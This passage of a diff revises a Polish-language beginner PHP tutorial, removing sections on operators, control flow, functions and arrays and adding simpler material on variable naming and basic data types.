-    <td><code>*</code></td>
-    <td>Mnożenie</td>
-    <td><code>$c = 10 * 5;</code></td>
-    <td>50</td>
-  </tr>
-  <tr>
-    <td><code>/</code></td>
-    <td>Dzielenie</td>
-    <td><code>$d = 10 / 5;</code></td>
-    <td>2</td>
-  </tr>
-  <tr>
-    <td><code>%</code></td>
-    <td>Modulo (reszta)</td>
-    <td><code>$e = 10 % 3;</code></td>
-    <td>1 (reszta z dzielenia)</td>
-  </tr>
-  <tr>
-    <td><code>**</code></td>
-    <td>Potęgowanie</td>
-    <td><code>$f = 2 ** 3;</code></td>
-    <td>8 (2 do potęgi 3)</td>
-  </tr>
-</table>
-
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<h4 style="margin-top: 0;">💡 Zastosowanie praktyczne</h4>
-<pre style="color: #333333;">
-$cenaNetto = 100;
-$stawkaVAT = 0.23;
-$kwotaVAT = $cenaNetto * $stawkaVAT;    // 23
-$cenaBrutto = $cenaNetto + $kwotaVAT;   // 123
-</pre>
-</div>
-
-### Operatory porównania - Fundament logiki w PHP
-
-<div style="background-color: #EDE7F6; border-left: 5px solid #673AB7; padding: 10px;">
-<p style="color: #333333;">Operatory porównania pozwalają na zestawienie dwóch wartości i sprawdzenie relacji między nimi. Zwracają wartość logiczną <code>true</code> (prawda) lub <code>false</code> (fałsz).</p>
-</div>
-
-<table>
-  <tr>
-    <th>Operator</th>
-    <th>Nazwa</th>
-    <th>Przykład</th>
-    <th>Wynik</th>
-  </tr>
-  <tr>
-    <td><code>==</code></td>
-    <td>Równe wartości</td>
-    <td><code>5 == "5"</code></td>
-    <td><code>true</code> (konwertuje typy)</td>
-  </tr>
-  <tr>
-    <td><code>===</code></td>
-    <td>Identyczne (wartość i typ)</td>
-    <td><code>5 === "5"</code></td>
-    <td><code>false</code> (różne typy)</td>
-  </tr>
-  <tr>
-    <td><code>!=</code></td>
-    <td>Różne wartości</td>
-    <td><code>5 != "6"</code></td>
-    <td><code>true</code></td>
-  </tr>
-  <tr>
-    <td><code>!==</code></td>
-    <td>Nieidentyczne</td>
-    <td><code>5 !== "5"</code></td>
-    <td><code>true</code> (różne typy)</td>
-  </tr>
-  <tr>
-    <td><code>&lt;</code></td>
-    <td>Mniejsze niż</td>
-    <td><code>5 < 10</code></td>
-    <td><code>true</code></td>
-  </tr>
-  <tr>
-    <td><code>&gt;</code></td>
-    <td>Większe niż</td>
-    <td><code>5 > 10</code></td>
-    <td><code>false</code></td>
-  </tr>
-  <tr>
-    <td><code>&lt;=</code></td>
-    <td>Mniejsze/równe</td>
-    <td><code>5 <= 5</code></td>
-    <td><code>true</code></td>
-  </tr>
-  <tr>
-    <td><code>&gt;=</code></td>
-    <td>Większe/równe</td>
-    <td><code>5 >= 10</code></td>
-    <td><code>false</code></td>
-  </tr>
-</table>
-
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px;">
-<h4 style="margin-top: 0;">⚠️ Różnica między == a ===</h4>
-<ul style="color: #333333;">
-<li><code>==</code> porównuje <b>wartość</b> (zawartość), automatycznie konwertując typy</li>
-<li><code>===</code> porównuje <b>wartość i typ</b> (muszą być identyczne)</li>
-<li>Zalecane jest używanie <code>===</code> dla bezpieczeństwa</li>
-</ul>
-</div>
-
-### Operatory logiczne - Łączenie warunków w złożone wyrażenia
-
-<div style="background-color: #FFF3E0; border-left: 5px solid #FF9800; padding: 10px;">
-<p style="color: #333333;">Operatory logiczne pozwalają łączyć wiele warunków w jedno wyrażenie, podobnie jak w matematycznej logice.</p>
-</div>
-
-<table>
-  <tr>
-    <th>Operator</th>
-    <th>Nazwa</th>
-    <th>Przykład</th>
-    <th>Wynik</th>
-  </tr>
-  <tr>
-    <td><code>&&</code> lub <code>and</code></td>
-    <td>AND (i)</td>
-    <td><code>$a && $b</code></td>
-    <td>Prawda tylko gdy oba są prawdziwe</td>
-  </tr>
-  <tr>
-    <td><code>||</code> lub <code>or</code></td>
-    <td>OR (lub)</td>
-    <td><code>$a || $b</code></td>
-    <td>Prawda gdy przynajmniej jeden jest prawdziwy</td>
-  </tr>
-  <tr>
-    <td><code>!</code></td>
-    <td>NOT (negacja)</td>
-    <td><code>!$a</code></td>
-    <td>Odwraca wartość logiczną</td>
-  </tr>
-</table>
+#### **Przykłady NIEPOPRAWNYCH nazw:**
 
 ```php
 <?php
-$wiek = 25;
-$maLicencje = true;
-
-// AND (&&) - oba warunki muszą być prawdziwe
-if ($wiek >= 18 && $maLicencje) {
-    echo "Może prowadzić samochód"; // To się wykona
-}
-
-// OR (||) - jeden z warunków musi być prawdziwy
-if ($wiek < 18 || !$maLicencje) {
-    echo "Nie może prowadzić samochodu";
-}
-
-// Złożone warunki z nawiasami
-if (($wiek >= 18 && $maLicencje) || ($wiek >= 16 && $czyKursant)) {
-    echo "Może prowadzić pojazd";
-}
+    $2test = "test";         // ❌ Zaczyna się od cyfry
+    $cena produktu = 19.99;  // ❌ Zawiera spację
+    $cena-produktu = 19.99;  // ❌ Zawiera znak -
+    imie = "Jan";            // ❌ Brak $ na początku
 ?>
 ```
 
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<h4 style="margin-top: 0; color: #333333;">💡 Tabela prawdy - jak działają operatory logiczne</h4>
-<pre >
+### **Typy danych w PHP**
 
-AND (&&):
-true && true = true
-true && false = false
-false && true = false
-false && false = false
+PHP automatycznie rozpoznaje typ danych. To nazywa się **dynamiczne typowanie**.
 
-OR (||):
-true || true = true
-true || false = true
-false || true = true
-false || false = false
+#### **1. STRING (tekst)**
 
-NOT (!):
-!true = false
-!false = true
-
-</pre>
-</div>
-
----
-
-## **5. Instrukcje sterujące - Kontrola przepływu programu**
-
-### Instrukcje warunkowe - Podejmowanie decyzji
-
-<div style="background-color: #E0F2F1; border-left: 5px solid #009688; padding: 10px;">
-<p style="color: #333333;">Instrukcje warunkowe pozwalają na wykonywanie różnych bloków kodu w zależności od spełnienia określonych warunków - to jak rozgałęzienia na drodze. Są podstawowym narzędziem do wprowadzania logiki decyzyjnej w programowaniu.</p>
-</div>
-
-#### Instrukcja if
+Tekst w cudzysłowach (pojedynczych lub podwójnych):
 
 ```php
 <?php
-// Prosta instrukcja if
-if (warunek) {
-    // Kod wykonywany, gdy warunek jest prawdziwy (true)
-}
-
-if ($wiek >= 18) {
-    echo "Jesteś dorosły.";
-} else {
-    // Kod wykonywany, gdy warunek jest fałszywy (false)
-}
-
-// Instrukcja if z wieloma alternatywami
-if (warunek1) {
-    // Kod wykonywany, gdy warunek1 jest prawdziwy
-} elseif (warunek2) {
-    // Kod wykonywany, gdy warunek1 jest fałszywy, ale warunek2 jest prawdziwy
-} else {
-    // Kod wykonywany, gdy wszystkie powyższe warunki są fałszywe
-}
+    $imie = "Jan";
+    $nazwisko = 'Kowalski';
+    $adres = "ul. Kwiatowa 15";
+    
+    // Różnica między " " a ' '
+    $wiek = 25;
+    echo "Mam $wiek lat";    // Wyświetli: Mam 25 lat (zmienna interpretowana)
+    echo 'Mam $wiek lat';    // Wyświetli: Mam $wiek lat (zmienna NIE interpretowana)
 ?>
 ```
 
-##### Przykład podstawowy:
+**Zasada:**
+- `"` (podwójny cudzysłów) - interpretuje zmienne
+- `'` (pojedynczy cudzysłów) - NIE interpretuje zmiennych
+
+#### **2. INTEGER (liczba całkowita)**
+
+Liczby bez części dziesiętnej:
 
 ```php
 <?php
-$wiek = 20;
-
-if ($wiek < 13) {
-    echo "Dziecko";
-} elseif ($wiek < 18) {
-    echo "Nastolatek";
-} else {
-    echo "Dorosły";
-}
+    $wiek = 25;
+    $ilosc = 100;
+    $ujemna = -50;
+    $zero = 0;
 ?>
 ```
 
-#### Instrukcja switch
+#### **3. FLOAT (liczba dziesiętna)**
+
+Liczby z częścią dziesiętną:
 
 ```php
 <?php
-$kolor = "zielony";
-
-switch ($kolor) {
-    case "czerwony":
-        echo "Wybrałeś kolor czerwony!";
-        break;
-    case "zielony":
-        echo "Wybrałeś kolor zielony!";
-        break;
-    case "niebieski":
-        echo "Wybrałeś kolor niebieski!";
-        break;
-    default:
-        echo "Nieznany kolor!";
-}
+    $cena = 19.99;
+    $wzrost = 175.5;
+    $pi = 3.14159;
+    $ujemna = -12.5;
 ?>
 ```
 
-### Pętle - powtarzanie działań
+**UWAGA:** W PHP używamy **kropki**, nie przecinka!
+- ✅ `$cena = 19.99;`
+- ❌ `$cena = 19,99;`
 
-<div style="background-color: #E1F5FE; border-left: 5px solid #03A9F4; padding: 10px;">
-<p style="color: #333333;">Pętle pozwalają na wielokrotne wykonywanie tego samego fragmentu kodu, co jest niezwykle przydatne przy pracy z dużymi zbiorami danych.</p>
-</div>
+#### **4. BOOLEAN (prawda/fałsz)**
 
-#### Pętla while
-
-```php
-<?php
-$licznik = 1;
-
-while ($licznik <= 5) {
-    echo "Licznik: $licznik<br>";
-    $licznik++;
-}
-?>
-```
-
-#### Pętla do...while
+Tylko dwie wartości: `true` lub `false`:
 
 ```php
 <?php
-$licznik = 1;
-
-do {
-    echo "Licznik: $licznik<br>";
-    $licznik++;
-} while ($licznik <= 5);
-?>
-```
-
-#### Pętla for
-
-```php
-<?php
-for ($i = 1; $i <= 5; $i++) {
-    echo "Liczba: $i<br>";
-}
-
-// Przykład z tablicą
-$owoce = ["jabłko", "banan", "gruszka"];
-
-for ($i = 0; $i < count($owoce); $i++) {
-    echo "Owoc: " . $owoce[$i] . "<br>";
-}
-?>
-```
-
----
-
-## **6. Funkcje - Organizacja kodu**
-
-### Czym są funkcje?
-
-<img src="https://i.imgur.com/a2FWlHz.png" width="200" align="right" alt="Ilustracja funkcji">
-
-<div style="background-color: #E8EAF6; border-left: 5px solid #3F51B5; padding: 10px;">
-<p style="color: #333333;">Funkcja to nazwany blok kodu, który można wywołać wielokrotnie. Funkcje są jak mini-programy wewnątrz programu głównego, które wykonują określone zadanie.</p>
-</div>
-
-### Dlaczego funkcje są ważne?
-
-<table>
-  <tr>
-    <td width="50px" align="center">🔁</td>
-    <td><b>Eliminacja powtórzeń:</b> Napisz kod raz, używaj wielokrotnie</td>
-  </tr>
-  <tr>
-    <td align="center">🧩</td>
-    <td><b>Organizacja:</b> Podział dużego problemu na mniejsze części</td>
-  </tr>
-  <tr>
-    <td align="center">🧪</td>
-    <td><b>Łatwość testowania:</b> Każda funkcja testowana osobno</td>
-  </tr>
-  <tr>
-    <td align="center">♻️</td>
-    <td><b>Ponowne wykorzystanie:</b> Te same funkcje w różnych projektach</td>
-  </tr>
-</table>
-
-### Definiowanie i wywoływanie funkcji
-
-```php
-<?php
-// Definicja funkcji
-function powitaj($imie) {
-    return "Witaj, $imie!";
-}
-
-// Wywołanie funkcji
-$komunikat = powitaj("Anna");
-echo $komunikat; // Witaj, Anna!
-
-// Funkcja z domyślną wartością parametru
-function obliczPodatek($kwota, $stawka = 0.23) {
-    return $kwota * $stawka;
-}
-
-echo obliczPodatek(100);      // 23 (użyje domyślnej stawki)
-echo obliczPodatek(100, 0.1); // 10 (użyje podanej stawki)
-?>
-```
-
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px;">
-<h4 style="margin-top: 0;">🧠 Anatomia funkcji</h4>
-<ul style="color: #333333;">
-<li><b>Słowo kluczowe <code>function</code></b> - deklaruje funkcję</li>
-<li><b>Nazwa funkcji</b> - najlepiej opisowa, co funkcja robi</li>
-<li><b>Parametry</b> - dane wejściowe w nawiasach ()</li>
-<li><b>Ciało funkcji</b> - kod do wykonania w nawiasach {}</li>
-<li><b>Instrukcja <code>return</code></b> - określa co funkcja zwraca</li>
-</ul>
-</div>
-
-### Funkcje wbudowane - Gotowe narzędzia PHP
-
-<div style="background-color: #FFF8E1; border-left: 5px solid #FFB300; padding: 10px;">
-PHP zawiera setki gotowych funkcji, które możesz od razu używać w swoich skryptach. Poznanie najważniejszych z nich znacznie przyspieszy Twoją pracę.
-</div>
-
-#### Funkcje dla tekstu (string)
-
-<table>
-  <tr>
-    <th>Funkcja</th>
-    <th>Działanie</th>
-    <th>Przykład</th>
-    <th>Wynik</th>
-  </tr>
-  <tr>
-    <td><code>strlen()</code></td>
-    <td>Długość tekstu</td>
-    <td><code>strlen("PHP")</code></td>
-    <td>3</td>
-  </tr>
-  <tr>
-    <td><code>strtoupper()</code></td>
-    <td>Zamienia na wielkie litery</td>
-    <td><code>strtoupper("php")</code></td>
-    <td>"PHP"</td>
-  </tr>
-  <tr>
-    <td><code>strtolower()</code></td>
-    <td>Zamienia na małe litery</td>
-    <td><code>strtolower("PHP")</code></td>
-    <td>"php"</td>
-  </tr>
-  <tr>
-    <td><code>str_replace()</code></td>
-    <td>Zamienia tekst</td>
-    <td><code>str_replace("PHP", "JS", "Lubię PHP")</code></td>
-    <td>"Lubię JS"</td>
-  </tr>
-  <tr>
-    <td><code>substr()</code></td>
-    <td>Fragment tekstu</td>
-    <td><code>substr("PHP jest super", 0, 3)</code></td>
-    <td>"PHP"</td>
-  </tr>
-</table>
-
-#### Funkcje dla tablic (array)
-
-<table>
-  <tr>
-    <th>Funkcja</th>
-    <th>Działanie</th>
-    <th>Przykład</th>
-  </tr>
-  <tr>
-    <td><code>count()</code></td>
-    <td>Liczba elementów</td>
-    <td><code>count([1,2,3])</code> → 3</td>
-  </tr>
-  <tr>
-    <td><code>sort()</code></td>
-    <td>Sortuje rosnąco</td>
-    <td><code>sort($tablica)</code></td>
-  </tr>
-  <tr>
-    <td><code>array_push()</code></td>
-    <td>Dodaje element na koniec</td>
-    <td><code>array_push($tablica, "nowy")</code></td>
-  </tr>
-  <tr>
-    <td><code>in_array()</code></td>
-    <td>Sprawdza czy element istnieje</td>
-    <td><code>in_array("PHP", $jezyki)</code> → true/false</td>
-  </tr>
-  <tr>
-    <td><code>array_merge()</code></td>
-    <td>Łączy tablice</td>
-    <td><code>array_merge($tab1, $tab2)</code></td>
-  </tr>
-</table>
-
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<h4 style="margin-top: 0;">💡 Porada</h4>
-<p style="color: #333333;">Gdy nie wiesz jak coś zrobić w PHP, najpierw sprawdź czy nie istnieje już gotowa funkcja! Dokumentacja PHP zawiera wszystkie wbudowane funkcje: <a href="https://www.php.net/manual/en/funcref.php">php.net/manual</a></p>
-</div>
-
----
-
-## **7. Tablice - Efektywne zarządzanie zbiorami danych**
-
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<p style="color: #333333;">Tablice to jedne z najpotężniejszych struktur danych w PHP. Pozwalają na przechowywanie wielu wartości pod jedną nazwą zmiennej, co znacząco ułatwia zarządzanie powiązanymi danymi.</p>
-</div>
-
-### Czym są tablice i dlaczego są tak ważne?
-
-<table>
-  <tr>
-    <td width="50px" align="center">📦</td>
-    <td><b>Organizacja danych:</b> Przechowywanie wielu wartości w jednej strukturze</td>
-  </tr>
-  <tr>
-    <td align="center">🔍</td>
-    <td><b>Efektywny dostęp:</b> Szybkie pobieranie danych przez indeks lub klucz</td>
-  </tr>
-  <tr>
-    <td align="center">🔄</td>
-    <td><b>Elastyczność:</b> Dynamiczne dodawanie i usuwanie elementów</td>
-  </tr>
-  <tr>
-    <td align="center">🧩</td>
-    <td><b>Złożone struktury:</b> Możliwość tworzenia wielowymiarowych struktur danych</td>
-  </tr>
-</table>
-
-### Rodzaje tablic w PHP
-
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px;">
-<h4 style="margin-top: 0;">PHP oferuje trzy główne typy tablic:</h4>
-<ul style="color: #333333;">
-<li><strong>Tablice indeksowane</strong> - używają liczb jako kluczy/indeksów (domyślnie od 0)</li>
-<li><strong>Tablice asocjacyjne</strong> - używają nazw jako kluczy (zamiast liczb)</li>
-<li><strong>Tablice wielowymiarowe</strong> - tablice zawierające inne tablice</li>
-</ul>
-</div>
-
-### Tworzenie tablic
-
-#### Tablice indeksowane
-
-```php
-<?php
-// Metoda 1: Używanie funkcji array()
-$owoce = array("jabłko", "banan", "pomarańcza");
-
-// Metoda 2: Składnia krótka (zalecana od PHP 5.4+)
-$kolory = ["czerwony", "zielony", "niebieski"];
-
-// Metoda 3: Tworzenie element po elemencie
-$liczby = [];
-$liczby[] = 10;  // Stanie się $liczby[0]
-$liczby[] = 20;  // Stanie się $liczby[1]
-$liczby[] = 30;  // Stanie się $liczby[2]
-
-// Dostęp do elementów przez indeks
-echo $owoce[0];    // Wyświetli: jabłko
-echo $kolory[1];   // Wyświetli: zielony
-echo $liczby[2];   // Wyświetli: 30
-?>
-```
-
-#### Tablice asocjacyjne
-
-```php
-<?php
-// Metoda 1: Używanie funkcji array() z kluczami
-$osoba = array(
-    "imie" => "Anna",
-    "wiek" => 30,
-    "miasto" => "Warszawa"
-);
-
-// Metoda 2: Składnia krótka
-$produkt = [
-    "nazwa" => "Laptop",
-    "cena" => 3500,
-    "dostepny" => true
-];
-
-// Metoda 3: Tworzenie element po elemencie
-$konfiguracja = [];
-$konfiguracja["temat"] = "ciemny";
-$konfiguracja["jezyk"] = "pl";
-$konfiguracja["powiadomienia"] = false;
-
-// Dostęp do elementów przez klucz
-echo $osoba["imie"];                 // Wyświetli: Anna
-echo $produkt["cena"] . " zł";       // Wyświetli: 3500 zł
-echo $konfiguracja["jezyk"];         // Wyświetli: pl
-?>
-```
-
-#### Tablice wielowymiarowe
-
-```php
-<?php
-// Tablica dwuwymiarowa (tablica tablic)
-$uczniowie = [
-    ["Jan", "Kowalski", "5A", [4, 5, 3, 4]],
-    ["Anna", "Nowak", "5B", [5, 5, 4, 5]],
-    ["Piotr", "Wiśniewski", "5A", [3, 4, 4, 3]]
-];
-
-// Dostęp do danych
-echo $uczniowie[0][0]; // Wyświetli: Jan (imię pierwszego ucznia)
-echo $uczniowie[1][3][2]; // Wyświetli: 4 (trzecia ocena drugiego ucznia)
-
-// Tablica wielowymiarowa z kluczami asocjacyjnymi
-$produkty = [
-    "elektronika" => [
-        ["nazwa" => "Laptop", "cena" => 3500],
-        ["nazwa" => "Smartfon", "cena" => 1800]
-    ],
-    "ksiazki" => [
-        ["nazwa" => "PHP dla początkujących", "cena" => 49],
-        ["nazwa" => "Mistrz programowania", "cena" => 59]
-    ]
-];
-
-// Dostęp do danych
-echo $produkty["elektronika"][0]["nazwa"]; // Wyświetli: Laptop
-echo $produkty["ksiazki"][1]["cena"]; // Wyświetli: 59
-?>
-```
-
-### Operacje na tablicach
-
-#### Dodawanie elementów
-
-```php
-<?php
-// Do tablicy indeksowanej
-$owoce = ["jabłko", "banan"];
-$owoce[] = "pomarańcza";  // Dodaje na koniec tablicy
-array_push($owoce, "gruszka", "śliwka");  // Dodaje wiele elementów na koniec
-
-// Do tablicy asocjacyjnej
-$osoba = ["imie" => "Jan", "nazwisko" => "Kowalski"];
-$osoba["wiek"] = 30;  // Dodaje nowy element z kluczem "wiek"
-$osoba["miasto"] = "Kraków";  // Dodaje nowy element z kluczem "miasto"
-
-// Wyświetlanie zawartości
-print_r($owoce);  // Array ( [0] => jabłko [1] => banan [2] => pomarańcza [3] => gruszka [4] => śliwka )
-print_r($osoba);  // Array ( [imie] => Jan [nazwisko] => Kowalski [wiek] => 30 [miasto] => Kraków )
-?>
-```
-
-#### Usuwanie elementów
-
-```php
-<?php
-$owoce = ["jabłko", "banan", "pomarańcza", "gruszka"];
-
-// Usuwanie pojedynczego elementu
-unset($owoce[1]); // Usuwa "banan" (indeks 1)
-print_r($owoce);  // Array ( [0] => jabłko [2] => pomarańcza [3] => gruszka )
-
-// UWAGA: unset() nie resetuje kluczy! Teraz indeks 1 nie istnieje
-
-// Resetowanie indeksów
-$owoce = array_values($owoce);
-print_r($owoce);  // Array ( [0] => jabłko [1] => pomarańcza [2] => gruszka )
-
-// Usuwanie ostatniego elementu
-$ostatni = array_pop($owoce);
-echo "Usunięto: " . $ostatni; // Wyświetli: Usunięto: gruszka
-
-// Usuwanie pierwszego elementu
-$pierwszy = array_shift($owoce);
-echo "Usunięto: " . $pierwszy; // Wyświetli: Usunięto: jabłko
-?>
-```
-
-#### Wyszukiwanie w tablicach
-
-```php
-<?php
-$owoce = ["jabłko", "banan", "pomarańcza", "gruszka"];
-
-// Sprawdzanie czy element istnieje
-if (in_array("banan", $owoce)) {
-    echo "Znaleziono banana!<br>";
-}
-
-// Znajdowanie indeksu elementu
-$indeks = array_search("pomarańcza", $owoce);
-echo "Pomarańcza jest pod indeksem: " . $indeks . "<br>"; // Wyświetli: 2
-
-// Sprawdzanie czy klucz istnieje
-$osoba = ["imie" => "Jan", "wiek" => 30];
-
-if (array_key_exists("imie", $osoba)) {
-    echo "Klucz 'imie' istnieje<br>";
-}
-
-// Bezpieczny dostęp do kluczy, które mogą nie istnieć
-$zawod = isset($osoba["zawod"]) ? $osoba["zawod"] : "nieznany";
-echo "Zawód: " . $zawod . "<br>"; // Wyświetli: Zawód: nieznany
-
-// Lub używając operatora null coalescing (PHP 7+)
-$zawod = $osoba["zawod"] ?? "nieznany";
-echo "Zawód: " . $zawod . "<br>"; // Wyświetli: Zawód: nieznany
-?>
-```
-
-#### Iteracja po tablicach
-
-```php
-<?php
-$owoce = ["jabłko", "banan", "pomarańcza", "gruszka"];
-
-echo "<h3>Pętla foreach z wartościami:</h3>";
-foreach ($owoce as $owoc) {
-    echo $owoc . "<br>";
-}
-
-echo "<h3>Pętla foreach z kluczami i wartościami:</h3>";
-foreach ($owoce as $indeks => $owoc) {
-    echo "Indeks $indeks: $owoc<br>";
-}
-
-// Iteracja po tablicy asocjacyjnej
-$osoba = [
-    "imie" => "Jan",
-    "nazwisko" => "Kowalski",
-    "wiek" => 30,
-    "miasto" => "Warszawa"
-];
-
-echo "<h3>Tablica asocjacyjna:</h3>";
-foreach ($osoba as $klucz => $wartosc) {
-    echo "$klucz: $wartosc<br>";
-}
-?>
-```
-
-#### Sortowanie tablic
-
-```php
-<?php
-$liczby = [5, 2, 8, 1, 9];
-$owoce = ["jabłko", "banan", "pomarańcza", "gruszka"];
-$osoby = [
-    ["imie" => "Jan", "wiek" => 30],
-    ["imie" => "Anna", "wiek" => 25],
-    ["imie" => "Piotr", "wiek" => 35]
-];
-
-// Sortowanie tablicy liczbowej (rosnąco)
-sort($liczby);
-echo "Posortowane liczby: " . implode(", ", $liczby) . "<br>";
-// Wyświetli: Posortowane liczby: 1, 2, 5, 8, 9
-
-// Sortowanie tablicy tekstowej (alfabetycznie)
-sort($owoce);
-echo "Posortowane owoce: " . implode(", ", $owoce) . "<br>";
-// Wyświetli: Posortowane owoce: banan, gruszka, jabłko, pomarańcza
-
-// Tablica asocjacyjna - sortowanie według wartości
-$produkty = ["laptop" => 3500, "mysz" => 120, "monitor" => 1000];
-
-// Sortowanie według wartości (cen) rosnąco
-asort($produkty);
-echo "<h3>Produkty według ceny (rosnąco):</h3>";
-foreach ($produkty as $nazwa => $cena) {
-    echo "$nazwa: $cena zł<br>";
-}
-// Wyświetli: mysz: 120 zł, monitor: 1000 zł, laptop: 3500 zł
-
-// Sortowanie według kluczy (nazw produktów) alfabetycznie
-ksort($produkty);
-echo "<h3>Produkty alfabetycznie:</h3>";
-foreach ($produkty as $nazwa => $cena) {
-    echo "$nazwa: $cena zł<br>";
-}
-// Wyświetli: laptop: 3500 zł, monitor: 1000 zł, mysz: 120 zł
-
-// Sortowanie tablicy złożonej według określonego pola
-usort($osoby, function($a, $b) {
-    return $a["wiek"] <=> $b["wiek"]; // Operator porównania (PHP 7+)
-});
-
-echo "<h3>Osoby według wieku:</h3>";
-foreach ($osoby as $osoba) {
-    echo "{$osoba['imie']}: {$osoba['wiek']} lat<br>";
-}
-// Wyświetli: Anna: 25 lat, Jan: 30 lat, Piotr: 35 lat
-?>
-```
-
-### Przydatne funkcje do pracy z tablicami
-
-<div style="overflow-x: auto; margin: 20px 0;">
-<table style="width: 100%; border-collapse: collapse; background-color: white; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
-  <thead>
-    <tr style="background-color: #3F51B5; color: white;">
-      <th style="padding: 12px 15px;">Kategoria</th>
-      <th style="padding: 12px 15px;">Funkcja</th>
-      <th style="padding: 12px 15px;">Opis</th>
-      <th style="padding: 12px 15px;">Przykład</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px; background-color: #E8EAF6;" rowspan="3"><strong>Informacje</strong></td>
-      <td style="padding: 12px 15px;"><code>count()</code></td>
-      <td style="padding: 12px 15px;">Zlicza elementy w tablicy</td>
-      <td style="padding: 12px 15px;"><code>count($owoce)</code> → 3</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>array_key_exists()</code></td>
-      <td style="padding: 12px 15px;">Sprawdza, czy klucz istnieje</td>
-      <td style="padding: 12px 15px;"><code>array_key_exists("imie", $osoba)</code> → true</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>in_array()</code></td>
-      <td style="padding: 12px 15px;">Sprawdza, czy wartość jest w tablicy</td>
-      <td style="padding: 12px 15px;"><code>in_array("jabłko", $owoce)</code> → true</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px; background-color: #FFF3E0;" rowspan="4"><strong>Sortowanie</strong></td>
-      <td style="padding: 12px 15px;"><code>sort()</code></td>
-      <td style="padding: 12px 15px;">Sortuje tablicę rosnąco</td>
-      <td style="padding: 12px 15px;"><code>sort($owoce);</code> // modyfikuje oryginalną tablicę</td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>rsort()</code></td>
-      <td style="padding: 12px 15px;">Sortuje tablicę malejąco</td>
-      <td style="padding: 12px 15px;"><code>rsort($liczby);</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>asort()</code></td>
-      <td style="padding: 12px 15px;">Sortuje wartości zachowując klucze</td>
-      <td style="padding: 12px 15px;"><code>asort($osoba);</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>ksort()</code></td>
-      <td style="padding: 12px 15px;">Sortuje według kluczy</td>
-      <td style="padding: 12px 15px;"><code>ksort($osoba);</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px; background-color: #E8F5E9;" rowspan="4"><strong>Transformacje</strong></td>
-      <td style="padding: 12px 15px;"><code>array_map()</code></td>
-      <td style="padding: 12px 15px;">Aplikuje funkcję do każdego elementu</td>
-      <td style="padding: 12px 15px;"><code>array_map('strtoupper', $owoce)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>array_filter()</code></td>
-      <td style="padding: 12px 15px;">Filtruje elementy wg funkcji</td>
-      <td style="padding: 12px 15px;"><code>array_filter($liczby, fn($n) => $n > 10)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>array_reduce()</code></td>
-      <td style="padding: 12px 15px;">Redukuje tablicę do wartości</td>
-      <td style="padding: 12px 15px;"><code>array_reduce($liczby, fn($a,$b) => $a+$b, 0)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>array_merge()</code></td>
-      <td style="padding: 12px 15px;">Łączy tablice</td>
-      <td style="padding: 12px 15px;"><code>array_merge($t1, $t2)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px; background-color: #E0F7FA;" rowspan="3"><strong>Ekstrakcja</strong></td>
-      <td style="padding: 12px 15px;"><code>array_slice()</code></td>
-      <td style="padding: 12px 15px;">Pobiera fragment tablicy</td>
-      <td style="padding: 12px 15px;"><code>array_slice($owoce, 1, 2)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>array_keys()</code></td>
-      <td style="padding: 12px 15px;">Zwraca klucze tablicy</td>
-      <td style="padding: 12px 15px;"><code>array_keys($osoba)</code></td>
-    </tr>
-    <tr style="border-bottom: 1px solid #ddd;">
-      <td style="padding: 12px 15px;"><code>array_values()</code></td>
-      <td style="padding: 12px 15px;">Zwraca wartości tablicy</td>
-      <td style="padding: 12px 15px;"><code>array_values($osoba)</code></td>
-    </tr>
-  </tbody>
-</table>
-</div>
-
-### Wizualizacja tablic
-
-<!-- Wizualizacja podstawowych tablic -->
-<div style="display: flex; flex-wrap: wrap; gap: 20px; margin: 20px 0;">
-    <!-- Przykład tablicy indeksowanej -->
-    <div style="flex: 1; min-width: 300px; border-radius: 8px; overflow: hidden;">
-        <div style="background-color: #4CAF50; color: white; padding: 8px; text-align: center; font-weight: bold;">
-            Tablica indeksowana $owoce
-        </div>
-        <table style="width: 100%; border-collapse: collapse; background-color: white;">
-            <tr style="background-color: #E8F5E9;">
-                <th style="padding: 8px; border-right: 1px solid #C8E6C9; color: #1B5E20; font-weight: bold;">Indeks</th>
-                <th style="padding: 8px; color: #1B5E20; font-weight: bold;">Wartość</th>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #C8E6C9; text-align: center; color: #2E7D32; background-color: #F1F8E9;">0</td>
-                <td style="padding: 8px; color:rgb(136, 109, 13)">jabłko</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #C8E6C9; text-align: center; color: #2E7D32; background-color: #F1F8E9;">1</td>
-                <td style="padding: 8px; color:rgb(136, 109, 13)">banan</td>
-            </tr>
-            <tr>
